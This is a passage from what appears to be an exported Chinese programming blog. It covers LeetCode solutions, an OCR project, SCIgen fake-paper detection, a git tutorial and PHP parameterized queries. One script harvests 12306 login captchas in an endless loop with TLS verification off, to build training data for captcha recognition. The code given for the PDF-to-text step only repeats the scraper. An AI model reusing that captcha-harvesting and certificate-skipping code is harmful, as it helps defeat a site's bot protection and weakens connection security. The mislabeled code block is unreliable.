range(len(s)): if vis[ord(s[i])]: while s[i] != s[start]: vis[ord(s[start])] = False start += 1 vis[ord(s[start])] = False start += 1 vis[ord(s[i])] = True max_len = max(max_len, i - start + 1) return max_len 方法3： 动态规划 设dp[j]为以s[j]结尾不重复字符的长度， i = vis[s[j]]则为s[j]字符上一次出现的位置。 则有： j - i &lt; dp[j - 1]： 说明上一次出现的位置在j - 1的子串里，只能重新开始，dp[j] = j - i j - i &gt; dp[j - 1]： 说明上一次出现的位置不在j - 1的子串里面，因此dp[j] = dp[j - 1] + 1 考虑一个特殊的情况，若s[j]第一次出现（i &lt; 0）必然有上面第二个式子成立。 123456789101112131415161718class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; vector&lt;int&gt; vis(128, -1); int last_max = 0, ans = 0; for (int j = 0; j &lt; s.size(); ++j) &#123; int i = vis[s[j]]; if (last_max &lt; j - i) &#123; last_max += 1; &#125; else &#123; last_max = j - i; &#125; vis[s[j]] = j; ans = max(ans, last_max); &#125; return ans; &#125;&#125;; 160. leetcode Intersection of Two Linked Lists Write a program to find the node at which the intersection of two singly linked lists begins. For example, the following two linked lists: 123456A: a1 → a2 ↘ c1 → c2 → c3 ↗ B: b1 → b2 → b3 begin to intersect at node c1. Notes: If the two linked lists have no intersection at all, return null. The linked lists must retain their original structure after the function returns. You may assume there are no cycles anywhere in the entire linked structure. Your code should preferably run in O(n) time and use only O(1) memory. 题目地址：leetcode Intersection of Two Linked Lists 题意：给定两个链表，返回其重复的第一个位置。 思路： 用哈希表O(n+m) 空间为O(m)或者O(n) 由于两个链表可能一长一短，故对其同时进行遍历时一定有一个先到达结尾。如果链表A先到结尾，则指向B的开头，如果B先到达结尾，则指向A的开头。然后继续进行遍历，这样两个链表一定同时到达结尾。当到达结尾时，如果之前最早出现过两个指针指向地址相同的，那么就是所求解。 这里只给出c的hash表代码，其他python什么的，见https://www.hrwhisper.me/?p=466 c 的hash表 123456789101112131415161718192021222324252627282930313233#define N (1&lt;&lt;14)int head[N], len = 0, mod = N - 1;struct node&#123; struct ListNode * val; int next;&#125;data[100000];void insert(struct ListNode *n)&#123; int pos = ((int)n) &amp; mod; data[len].val = n; data[len].next = head[pos]; head[pos] = len++;&#125;bool found(struct ListNode *n)&#123; int pos = ((int)n) &amp; mod; for (int i = head[pos]; i != -1;)&#123; if (data[i].val == n) return true; i = data[i].next; &#125; return false;&#125;struct ListNode *getIntersectionNode(struct ListNode *headA, struct ListNode *headB) &#123; memset(head, -1, sizeof(head)); for (; headA; headA = headA-&gt;next) insert(headA); for (; headB; headB = headB-&gt;next) if (found(headB)) return headB; return NULL;&#125; 202 leetcode Happy Number Write an algorithm to determine if a number is \"happy\". A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers. Example: 19 is a happy number 12 + 92 = 82 82 + 22 = 68 62 + 82 = 100 12 + 02 + 02 = 1 题目地址： leetcode Happy Number 题意：给你一个数，判断是否为Happy number （对n每个字母求平方和，成为下一个n~若n为1，则为happy number） 思路： 用hash表判断是否循环，若循环则不是happy number 4为非happy number循环必经点。所以可以判断n是否为4即可。（这个是看discuss的） C 12345678910111213141516171819202122232425262728293031323334353637383940#define N (1&lt;&lt;7)int head[N], len &#x3D; 0, mod &#x3D; N - 1;struct node&#123; int val; int next;&#125;data[10000];void insert(int n)&#123; int pos &#x3D; n &amp; mod; data[len].val &#x3D; n; data[len].next &#x3D; head[pos]; head[pos] &#x3D; len++;&#125;bool found(int n)&#123; int pos &#x3D; n &amp; mod; for (int i &#x3D; head[pos]; i !&#x3D; -1; i &#x3D; data[i].next) if (data[i].val &#x3D;&#x3D; n) return true; return false;&#125;int cal(int n)&#123; int ans &#x3D; 0; while (n) &#123; int t &#x3D; n % 10; n &#x2F;&#x3D; 10; ans +&#x3D; t * t; &#125; return ans;&#125;bool isHappy(int n) &#123; memset(head, -1, sizeof(head)); while (true)&#123; n &#x3D; cal(n); if (n &#x3D;&#x3D; 1) return true; if (found(n)) return false; insert(n); &#125;&#125; C++ 1234567891011121314151617181920212223class Solution &#123;public: bool isHappy(int n) &#123; unordered_set&lt;int&gt; table; table.insert(n); while (true)&#123; n = cal(n); if (n == 1) return true; if (table.find(n) != table.end()) return false; table.insert(n); &#125; &#125; int cal(int n)&#123; int ans = 0; while (n) &#123; int t = n % 10; n /= 10; ans += t * t; &#125; return ans; &#125;&#125;; Python 1234567891011class Solution: # @param &#123;integer&#125; n # @return &#123;boolean&#125; def isHappy(self, n): table = set() while True: squere_sum = sum(int(i) **2 for i in str(n)) if squere_sum == 1: return True elif squere_sum in table: return False table.add(squere_sum) n = squere_sum 242. Valid Anagram Given two strings s and t, write a function to determine if t is an anagram of s. For example, s = \"anagram\", t = \"nagaram\", return true. s = \"rat\", t = \"car\", return false. Note: You may assume the string contains only lowercase alphabets. Follow up: What if the inputs contain unicode characters? How would you adapt your solution to such case? 题目地址：leetcode Valid Anagram 题意：给定两个字符串，判断他们是否是相同字母异序的串 题意： 看到这个，排序嘛！ 12345678class Solution(object): def isAnagram(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: bool &quot;&quot;&quot; return sorted(s) == sorted(t) 更快的呢？用hash表计算出现的次数 1234567891011121314class Solution(object): def isAnagram(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: bool &quot;&quot;&quot; if len(s) != len(t): return False n = len(s) vis = [0] * 26 for i in xrange(n): vis[ord(s[i]) - 97] += 1 vis[ord(t[i]) - 97] -= 1 return filter(lambda x: x != 0, vis) == [] 当然可以用Python的Counter类开挂- - 继续oneline 12345678class Solution(object): def isAnagram(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: bool &quot;&quot;&quot; return collections.Counter(s) == collections.Counter(t)","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"ocr 识别","slug":"ocr-procedure","date":"2015-06-21T03:11:40.000Z","updated":"2021-01-08T13:42:14.072Z","comments":true,"path":"ocr-procedure/","link":"","permalink":"https://www.hrwhisper.me/ocr-procedure/","excerpt":"OCR （Optical Character Recognition，光学字符识别）是指电子设备（例如扫描仪或数码相机）检查纸上打印的字符，通过检测暗、亮的模式确定其形状，然后用字符识别方法将形状翻译成计算机文字的过程；即，针对印刷体字符，采用光学的方式将纸质文档中的文字转换成为黑白点阵的图像文件，并通过识别软件将图像中的文字转换成文本格式，供文字处理软件进一步编辑加工的技术。 本文初步介绍了 OCR 识别 的基本过程。","text":"OCR （Optical Character Recognition，光学字符识别）是指电子设备（例如扫描仪或数码相机）检查纸上打印的字符，通过检测暗、亮的模式确定其形状，然后用字符识别方法将形状翻译成计算机文字的过程；即，针对印刷体字符，采用光学的方式将纸质文档中的文字转换成为黑白点阵的图像文件，并通过识别软件将图像中的文字转换成文本格式，供文字处理软件进一步编辑加工的技术。 本文初步介绍了 OCR 识别 的基本过程。 一、问题分析 图像中的文字识别可以看为图像分类的问题。即根据形状来判断是属于哪个字母。对于分类问题，一般需要训练数据和测试数据，分类器我采用支持向量机（SVM） 二、具体过程 a) 训练样本的输入 orc-trainData 首先对图进行灰度化，之后进行二值化(即变为0和1两个值)。对其进行分割为6*13的小图像，对每个图像找出最小的边缘（最左最右，最上最下）。 由于字母有大有小，进行归一化为同样的大小，32*32,最终的结果如下图 orc-trainData-result b)测试样本的读入 orc-testData 同样的对图像进行进行二值化，找出所有的字符，然后根据间距判断是否为同一个单词，是否为同一行，进行分组。即（分为行，单词，字符） 对每一组内的每个单词的每个字符进行大小归一化，并按行输出结果。 如下图： orc-testData-result orc-trainData-result2 有一些难以区分的字母，所以划分错误。如I和l ，O和C但大部分还是准确的。 c) 纠错 因为有字母是相近的，所以容易区分错误。 单词纠错可以通过编辑距离来实现。 编辑距离，又称Levenshtein距离，是指两个字串之间，由一个转成另一个所需的最少编辑操作次数。许可的编辑操作包括将一个字符替换成另一个字符，插入一个字符，删除一个字符。 例如将kitten一字转成sitting： sitten （k→s） sittin （e→i） sitting （→g） 对于一个单词，判断其是否存在于字典中。(字典选取Tesseract-OCR词频表) 若存在 判断正确，可以直接输出。 若不存在 对其进行编辑操作，1次，看是否在字典中，存在则输出 对其的编辑操作在做一次编辑操作，看是否在字典中，存在则输出 若以上两个步骤中存在多个单词，则选取频率最高的进行输出 纠错样例： orc-correctWord d) 其他测试数据及结果 ocr-other-testfile ocr-other-testfile-result 三、小结 本次实验在上一次的结果中进行了纠错，进一步提高了准确率。 但仍然存在一些不足，如字符纠错的时候，可以考虑数字0和字母o的相似性，直接进行转化。 在做的过程中，发现了这个领域上的难度。比如字体的不同可能需要新的训练样本、字母如果过小难以拆分等等。 总体来说，任务基本完成。也从中学到了许多知识。 本文所有代码：https://github.com/hrwhisper/myOcr","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"课程设计","slug":"study/课程设计","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"svm","slug":"svm","permalink":"https://www.hrwhisper.me/tags/svm/"}]},{"title":"scigen detection","slug":"scigen-detection","date":"2015-06-19T11:46:49.000Z","updated":"2020-10-19T16:24:16.383Z","comments":true,"path":"scigen-detection/","link":"","permalink":"https://www.hrwhisper.me/scigen-detection/","excerpt":"SCIgen is a program that generates random Computer Science research papers, including graphs, figures, and citations. It uses a hand-written context-free grammar to form all elements of the papers. Our aim here is to maximize amusement, rather than coherence. One useful purpose for such a program is to auto-generate submissions to conferences that you suspect might have very low submission standards. A prime example, which you may recognize from spam in your inbox, is SCI/IIIS and its dozens of co-located conferences (check out the very broad conference description on the WMSCI 2005 website). There's also a list of known bogus conferences. Using SCIgen to generate submissions for conferences like this gives us pleasure to no end. In fact, one of our papers was accepted to SCI 2005! See Examples for more details.","text":"SCIgen is a program that generates random Computer Science research papers, including graphs, figures, and citations. It uses a hand-written context-free grammar to form all elements of the papers. Our aim here is to maximize amusement, rather than coherence. One useful purpose for such a program is to auto-generate submissions to conferences that you suspect might have very low submission standards. A prime example, which you may recognize from spam in your inbox, is SCI/IIIS and its dozens of co-located conferences (check out the very broad conference description on the WMSCI 2005 website). There's also a list of known bogus conferences. Using SCIgen to generate submissions for conferences like this gives us pleasure to no end. In fact, one of our papers was accepted to SCI 2005! See Examples for more details. scigen 是一个自动的论文生成软件，利用上下文无关文法自动生成无意义的英文科学研究论文，内容包含图片、表格、流程图和参考文献等。有的scigen生成的论文在竟然被权威机构给收录！（如WMSCI 2005）本博文探讨如何进行对scigen生成的伪论文进行判别。即类似于 scigen detection 的工作 一、任务目标 给定一篇（些）论文，判断其是否为真论文，即非scigen生成的论文。 二、数据预处理 (一) 获取训练样本 正样本来源：由老师给定的各种论文样本 负样本来源：于MIT scigen上爬取下来的论文 Python爬虫爬取的代码如下：(保存在j://unrealpdf/文件夹中，每次捕获200篇) 1234567891011121314151617181920212223242526272829303132333435363738# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipser功能 ： 下载scigen生成的论文&#x27;&#x27;&#x27;import requestsfrom bs4 import BeautifulSoupdef download_file(url,local_filename): r = requests.get(url, stream=True) with open(local_filename, &#x27;wb&#x27;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush() return local_filenamesavePath = &#x27;j://unrealpdf/&#x27;url = &#x27;http://pdos.csail.mit.edu/cgi-bin/sciredirect.cgi?author=&amp;author=&amp;author=&amp;author=&amp;author=&#x27;for i in xrange(200): try: r=requests.get(url) if r.status_code==200: soup=BeautifulSoup(r.text) link = soup.find_all(&#x27;a&#x27;)[1] new_link=&#x27;http://scigen.csail.mit.edu&#x27;+link.get(&#x27;href&#x27;) filename = r.url.split(&#x27;/&#x27;)[-1][:-4]+&#x27;pdf&#x27; file_path=download_file(new_link,savePath + filename) print str(i+1) + &#x27; downloading: &#x27;+filename else: print &#x27;errors: &#x27; +str(i) except Exception,e: print eprint &#x27;ok&#x27; (二)将pdf转化为txt 该步骤仍是预处理的阶段，目的是便于处理相应的论文。 1234567891011121314151617181920212223242526272829303132333435# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipser功能 ： 下载scigen生成的论文&#x27;&#x27;&#x27;import requestsfrom bs4 import BeautifulSoupdef download_file(url,local_filename): r = requests.get(url, stream=True) with open(local_filename, &#x27;wb&#x27;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush() return local_filenamesavePath = &#x27;j://unrealpdf/&#x27;url = &#x27;http://pdos.csail.mit.edu/cgi-bin/sciredirect.cgi?author=&amp;author=&amp;author=&amp;author=&amp;author=&#x27;for i in xrange(200): try: r=requests.get(url) if r.status_code==200: soup=BeautifulSoup(r.text) link = soup.find_all(&#x27;a&#x27;)[1] new_link=&#x27;http://scigen.csail.mit.edu&#x27;+link.get(&#x27;href&#x27;) filename = r.url.split(&#x27;/&#x27;)[-1][:-4]+&#x27;pdf&#x27; file_path=download_file(new_link,savePath + filename) print str(i+1) + &#x27; downloading: &#x27;+filename else: print &#x27;errors: &#x27; +str(i) except Exception,e: print eprint &#x27;ok&#x27; 转化结果还是十分不错的。 (三) 文档预处理： 我将文档的去除分为以下几个方面： 去除图和表格 论文的图和表格主要是起解释说明的作用，而且难以进行判断 去除方法：在pdf转化为txt已经自动进行了“去除” 去除标题和作者信息 至于作者只是署名文章的所有权，对文意并不会产生影响 去除方法：论文读取从“Abstract”开始 去除Reference 信息 参考文献，由于大部分是人名/书名等，去除其对论文判别几乎不会产生任何影响（毕竟scigen也可以加入这些信息）。 去除方法：读取到reference时候该论文不再读取 去除论文引用的标号 [] 文章的一些[]括号主要是标注了参考文献的信息，可以删去 去除方法： 正则表达式 将其他括号，标点符号替换为空 （）主要是起到解释说明的作用，去除这些符号对原文大意几乎无影响。而其他的标点符号主要用于断句，也可考虑去除。 去除方法： 正则表达式 所有单词转化为小写 大小写其实是一个单词，只有是是否位于句首的区别而已。若不统一，可能会出现Smart 和 smart 被认为是两个单词。 解决方法：用python内置函数转化为小写字母 数字归一化处理 论文中的数字可能只是表示数量多少，大小等等，可以将其统一转为某个表明其为数字的符号，或者用某个具体的数来替代，减少一些重复。 解决方法：正则表达式 12345678910111213141516171819202122232425262728# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipser功能 : 对pdf转化成的txt进行预处理，如删除作者信息&#x27;&#x27;&#x27;import re, osrefer = re.compile(r&#x27;\\[\\d*\\]&#x27;)other = re.compile(r&#x27;[(),&lt;&gt;-_&quot;]&#x27;)num = re.compile(r&#x27;\\d+(.\\d+)?&#x27;)txtpath = r&#x27;./testpaper/&#x27;outpath = r&#x27;./testpaper/&#x27;files = os.walk(txtpath).next()[-1]for file in files: print file with open(txtpath+file,&#x27;r&#x27;) as f: content = f.read().lower() #去除作者信息 temp_index = content.find(&#x27;abstract&#x27;) if temp_index != -1: content = content[temp_index+8:] #去除参考文献信息 temp_index = content.rfind(&#x27;references&#x27;) if temp_index != -1: content = content[:temp_index] f.close() with open(outpath+file, &#x27;w&#x27;) as wf: wf.write(num.sub(&#x27;1&#x27;,other.sub(&#x27; &#x27;,refer.sub(&#x27;&#x27;,content)))) 三、识别方法探究 判别scigen可以说就是一个二分类问题，给定一篇论文，判断其是否为scigen生成的。 在以上的几个步骤中，已经完成了样本从PDF转为TXT纯文本形式，并对其进行了预处理。 接下来主要在于进行提取文档的特征，来加以区分真假论文。 (一)词同现网络 1.词同现网络简介及网络构建 词同现网络：若两个词汇在同一单元（如邻接、段落）中共现，则认为它们存在关联关系。 词同现网络的思想是：对于每一个单词，对应词同现网络中的一个节点。若一个句子中的两个词之间间隔为n时存在词同现关系，即在网络中有边相连。 而大量的实践表明，n=2是比较合适的。两个词在句子中相邻出现是比较常见的。 如：lovely girl 间距为1，buy an apple的buy 和apple间距为2。 而如果n取过大，会引入大量的无关的词语，增加模型的复杂度。 在我构建的词同现网络中，段和段之间相对是独立的，而一个段落里说明的内容是相关的。即一个段落中的两个相邻句子之间是有关联的。对于一个段落中相邻的两个句子，将其处理为第一个句子的最后一个词和第二个句子的第一个词之间的间距为2。 对于一篇论文的词同现网络，我们可以计算出它的：计算出它的结点数、边数、平均度数、平均路径长度、网络直径、聚集系数，并且用这六个特征来表示这个网络。 2.分类器的选择 我分别尝试了SVM和KNN进行训练和识别，结果如下： scigen-detection-svm ▲SVM scigen-detection-knn ▲KNN 在测试样本一共894篇的情况下，SVM有97.87%的准确率，而KNN有99.33%的准确率。 12345678910111213141516171819202122232425262728293031323334353637383940# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipser功能 ： 使用knn/svm进行判别&#x27;&#x27;&#x27;from sklearn import svmfrom sklearn.neighbors import KNeighborsClassifierknn = FalserealPath = &#x27;./data/paper.data&#x27;unRealPath = &#x27;./data/scigen.data&#x27;testPath = &#x27;./data/test.data&#x27;realNum = 176unrealNum = 176def getTestCase(path,isReal): test_input ,fileNames = [],[] with open(path,&#x27;r&#x27;) as f: for line in f: line = line.strip() content = line.split(&#x27; &#x27;) fileName = content[0] fileNames.append(fileName) temp = [] for i in content[1:-1]: temp.append(float(i)) test_input.append(temp) return fileNames,test_input, [isReal for i in xrange(len(test_input))]fileNames,input1,output1 = getTestCase(realPath,True)fileNames,input2 , output2 = getTestCase(unRealPath,False)train_input , train_output = input1[:realNum] + input2[:unrealNum] ,output1[:realNum]+output2[:unrealNum]fileNames,test_input , test_output = getTestCase(testPath,True)clf = KNeighborsClassifier(n_neighbors=3) if knn else svm.SVC(gamma=0.4,C=2)clf.fit(train_input,train_output)predicted = clf.predict(test_input)for filename,result in zip(fileNames,predicted): print filename,result (二) 层次聚类 1.文档距离描述 scigen-bow-distance 2. 层次聚类（Hierarchical clustering） 层次聚类通过不断的将最为相似的群组两两合并，来构造出一个群组的层级结构。具体的可以由如下图表示： Hierarchical-clustering 同样的，我用上述的距离描述方法，对正负样本进行了层次聚类，结果如下（200个的也是同样的效果显著） scigen-detection-hierarchical-clustering-result 可以看出的是，scigen生成的伪论文都聚在一起。 证明这个距离的度量方法还是可靠的。 3. 判别方法 对于一篇论文直接找最近距离的效果并不是很好，于是我想到了类似KNN的思想，求出距离后，进行排序，看更接近哪个类。 结果如图： scigen-detection-bow 识别率高达99.55% 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipser功能 ： 使用bag of words测试&#x27;&#x27;&#x27;import osimport refrom math import fabstruePath = r&#x27;./data/true&#x27;falsePath = r&#x27;./data/false&#x27;testPaper = r&#x27;./testpaper/&#x27;separator = re.compile(r&#x27;[!?.\\n\\t\\r]&#x27;)def calFrequent(path,num,isTrain=True): frequencies = &#123;&#125; files = os.walk(path).next()[-1][:num] if isTrain else os.walk(path).next()[-1] for fileName in files: content = &#x27;&#x27; with open(path + &#x27;/&#x27; + fileName, &#x27;r&#x27;) as f: content = f.read() content = separator.sub(&#x27; &#x27;, content) words = content.split(&#x27; &#x27;) curDic = &#123;&#125; for word in words: if word: curDic.setdefault(word, 0) curDic[word] += 1 frequencies[fileName] = curDic # dic&#123; filename dic&#123;word:wordCnt&#125; &#125; return frequenciesdef calPaperDistance(dicA, dicB): NA = sum([cnt for word, cnt in dicA.items()]) NB = sum([cnt for word, cnt in dicB.items()]) #if NA==0 or NB==0:return 0x7ffffff rate = NA * 1.0 / NB dis = 0 for word in dicA: if word in dicB: dis = dis + fabs(dicA[word] - dicB[word] * rate) elif (dicA[word] &gt;&gt; 1) != 0: dis = dis + dicA[word] for word in dicB: if word not in dicA : dis = dis + dicB[word] return dis * 1.0 / (NA &lt;&lt; 1)trainNum = 176trueFre = calFrequent(truePath,trainNum,isTrain=True)falseFre = calFrequent(falsePath,trainNum,isTrain=True)train_data = dict(trueFre , **falseFre)train_fileName = [name[0] for i , name in enumerate(train_data.items())]test_data = calFrequent(testPaper,trainNum,isTrain=False)test_fileName = [name[0] for i , name in enumerate(train_data.items())]k = 3for fileName , wordCnt in test_data.items(): distances = [(fileTrain,calPaperDistance(wordCnt, wordCntTrain)) for fileTrain,wordCntTrain in train_data.items()] distances.sort(key=lambda x:x[1]) truePaper = falsePaper = 0 for name , dis in distances[:k]: temp_tag = False if name.find(&#x27;scimakelatex&#x27;)!=-1 else True if temp_tag: truePaper+=1 else: falsePaper+=1 print fileName,True if truePaper &gt; falsePaper else False 四、小结 本次通过分类器的方法，对论文的真假进行了判断，是在前两次实验的基础上建立的。 第一次实验进行了scigen源代码的解读，了解了其生成论文的方法(上下文无关法) 第二次主要是对样本的收集及数据的预处理。 无论是用词同现网络还是分层聚类，能得出良好结果的根本原因都在于scigen生成的论文词汇量有限，与自然语言还存在着一定的区别。 本文 所有代码详见github : https://github.com/hrwhisper/scigen-detection","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"课程设计","slug":"study/课程设计","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"svm","slug":"svm","permalink":"https://www.hrwhisper.me/tags/svm/"},{"name":"bow","slug":"bow","permalink":"https://www.hrwhisper.me/tags/bow/"},{"name":"knn","slug":"knn","permalink":"https://www.hrwhisper.me/tags/knn/"}]},{"title":"12306 验证码 爬取","slug":"crawling-12306-verification-code","date":"2015-05-22T02:17:46.000Z","updated":"2021-01-08T13:42:14.080Z","comments":true,"path":"crawling-12306-verification-code/","link":"","permalink":"https://www.hrwhisper.me/crawling-12306-verification-code/","excerpt":"本文是 12306 验证码 的爬取 ，由于同学在做 12306 验证码 识别，我就顺手写了一个爬虫来爬取验证码。=v=","text":"本文是 12306 验证码 的爬取 ，由于同学在做 12306 验证码 识别，我就顺手写了一个爬虫来爬取验证码。=v= 几点说明 由于12306过快刷新会提示稍后再来，所以我就调用time.sleep 休眠一秒。 还有需要注意的是，由于12306的https证书坑爹，所以用requests的话，需要设置verify = False Code 使用方法：在相应的savePath 建立相应的路径。然后运行代码即可。比如我的路径是E:\\12306，提前建好文件夹即可。。。 123456789101112131415161718# -*- coding:utf-8 -*-import timeimport requestsdef download_file(url,local_filename): r = requests.get(url, stream=True,verify = False) with open(local_filename, &#x27;wb&#x27;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush() return local_filenamesavePath = &#x27;E://12306/&#x27;url = &#x27;https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=login&amp;rand=sjrand&amp;0.7923694306518883&#x27;for i in xrange(0x7fffffff): print download_file(url, savePath + str(i+1) +&#x27;.jpg&#x27;) time.sleep(1) #休眠一秒 Python爬虫系列教程 python 爬虫 入门 python模拟登陆 python 爬虫之模拟登陆实战（一）微人大 python 爬虫之模拟登陆实战（二）百度","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"github 使用教程 git 使用教程","slug":"use-git-and-github","date":"2015-05-21T04:19:22.000Z","updated":"2021-01-08T13:42:14.035Z","comments":true,"path":"use-git-and-github/","link":"","permalink":"https://www.hrwhisper.me/use-git-and-github/","excerpt":"写在前面 做软件开发的常常需要进行版本控制，而Git是一个灰常流行的分布式版本控制系统。 下面来讲讲配置。","text":"写在前面 做软件开发的常常需要进行版本控制，而Git是一个灰常流行的分布式版本控制系统。 下面来讲讲配置。 一、Git入门 windows用户从http://msysgit.github.io/下载msysgit，然后按默认选项安装即可。 安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”如下图： open git bash 接着输入如下内容： 12$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot; 即说明自己的名字和Email地址。（因为Git是分布式版本控制系统，所以，每个机器都必须自报家门） 输入类似如下图的命令，即进入你想要的git目录， 博主先进入了e:，并且将这个目录初始化为Git仓库，在该目录下创建一个名为githubTest的文件夹。 1234567891011$ cd e:\\githrsay@HRWHISPER /e/git$ git initInitialized empty Git repository in e:/git/.git/hrsay@HRWHISPER /e/git (master)$ mkdir githubTesthrsay@HRWHISPER /e/git (master)$ cd githubTest/ createDir 接下来用在下面创建个文件，如readme.txt，在里面写上若干内容。 接着通过git add 命令进行添加操作，用git commit进行提交操作 123456$ git add readme.txt$ git commit -m &quot;add readme file&quot;[master (root-commit) 5db86ed] add readme file1 file changed, 1 insertion(+)create mode 100644 githubTest/readme.txt 这样，你的仓库里就有一个名为readme.txt的东西啦 二、远程仓库 github 1.创建ssh key 如果你学过密码学，那你一定知道公钥和私钥。 我们访问github需要告诉github你的公钥，而你的私钥则要自己保管好。 所以我们需要创建一个ssh key，打开Git Bash，输入如下命令， 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 一路回车，使用默认配置即可。 如下图： gitrsa 我的被保存在 C:.ssh，打开该目录，可以看到两个文件，其中id_rsa是私钥，id_rsa.pub是公钥。 2.github设置 登陆github，点击右上方settings，进入ssh keys，接下来点击add ssh keys，在key中粘贴id_rsa.pub里的内容。 最后点击addkey完成。 如下图： githubsetting 3.提交至github 首先需要创建一个新的仓库。如图： create new repository 接下来你可以使用如下的命令进行提交。 https://github.com/hrwhisper/githubTest.git 记得改成你自己的！ 12git remote add origin https://github.com/hrwhisper/githubTest.gitgit push -u origin master 在执行第二条的时候，可能会要求验证用户名和密码，按提示输入即可。 最后如下图，就算提交成功。 123456Counting objects: 4, done.Writing objects: 100% (4/4), 275 bytes 0 bytes/s, done.Total 4 (delta 0), reused 0 (delta 0)To https://github.com/hrwhisper/githubTest.git * [new branch] master -&gt; masterBranch master set up to track remote branch master from origin. 去github刚才创建的仓库看看吧！会发现多了个文件夹和里面有你的readme.txt~ 三、多人开发 fork后，如何进行同步最新代码呢？ 首先添加源，比如： 12git remote add upstream https://github.com/hrwhisper/CourseSelectgit remote -v git remote -v 后，应该出现我的地址。 然后用如下命令即可 12git fetch upstreamgit merge upstream/master 四、可以使用github官方的客户端 前往https://windows.github.com/下载客户端。 下载安装完后，启动软件如图，很喜欢简洁而优雅的风格^ ^ githubforwindows 进入后，需要先进行登录，位于右上方的那个设置的按钮，点击options,接下来点击add account，输入用户名密码即可。 接下来点击左上角的+ 号，创建一个仓库。 createNewRepository 创建完后，点击该仓库，右上角有个发布的，发布后即可在github上看到。 publish 接下来我们在该仓库的目录下创建一个readme.txt，它很快就检测到了改变，然后进行如下图的提交，并同步，你可以在你的github下看到相应的变化 :) sync 这个方法比前面的git简单得多，推荐使用。 有什么不懂的欢迎留言 : )","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"php 服务器 数据库查询","slug":"php-server-database-use","date":"2015-05-16T05:51:44.000Z","updated":"2020-10-21T00:45:47.291Z","comments":true,"path":"php-server-database-use/","link":"","permalink":"https://www.hrwhisper.me/php-server-database-use/","excerpt":"最近用PHP写服务器，都忘了PHP了 看以前的代码，mysql_connect 什么的都不推荐使用了！T^T","text":"最近用PHP写服务器，都忘了PHP了 看以前的代码，mysql_connect 什么的都不推荐使用了！T^T 源代码 （当然这是本地的测试版，服务器版数据库名用户名密码都改了） 使用参数化查询防止sql注入 123456789101112131415161718192021222324252627282930&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;);//设置统一输出编码为utf-8 $building = $_POST[&#x27;building&#x27;]; $week = $_POST[&#x27;week&#x27;]; $startTime = $_POST[&#x27;startTime&#x27;]; $endTime = $_POST[&#x27;endTime&#x27;]; $conn=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;rucHelper&quot;); //数据库连接 if ($conn-&gt;connect_errno) &#123; printf(&quot;Connect failed: %s\\n&quot;, $mysqli-&gt;connect_error); exit(); &#125; $conn-&gt;query(&quot;SET NAMES utf8&quot;); //设置读取数据后的编码 //var_dump($conn); $stmt=$conn-&gt;prepare(&#x27;SELECT distinct classroom FROM allcourse WHERE building =? and classroom not in (SELECT distinct classroom FROM allcourse where building =? and week =? and (startTime &gt;=? and startTime&lt;=? or endTime &gt;=? and endTime &lt;=?) ) order by classroom&#x27;); $stmt-&gt;bind_param(&quot;ssddddd&quot;,$building,$building,$week,$startTime,$endTime,$startTime,$endTime);//参数化查询 $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); while ($row = 